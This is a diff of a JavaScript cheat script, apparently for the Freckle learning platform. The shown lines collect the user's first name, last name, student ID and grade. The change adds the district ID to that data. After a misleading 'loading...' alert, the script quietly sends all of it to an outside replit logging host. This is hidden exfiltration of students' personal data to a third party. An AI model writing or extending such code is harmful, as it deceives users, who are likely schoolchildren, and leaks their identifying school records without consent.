@@ -40,7 +40,7 @@ var response= await fetch("https://api.freckle.com/3/subjects/math/products/targ
 json=await response.json()
 setTimeout(coins, 1);
 }
-dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" coins.js"+" "+g["grade"]
+dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" coins.js"+" "+g["grade"]+" district: "+g["districtId"]
 alert("loading... (press ok to continue, this process may take a couple of seconds)")
 await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
   method: "GET",
